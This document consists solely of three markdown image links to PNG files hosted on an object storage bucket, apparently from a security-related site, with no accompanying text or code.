![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/3-1733460426.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/5-1733460426.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1733460427.png)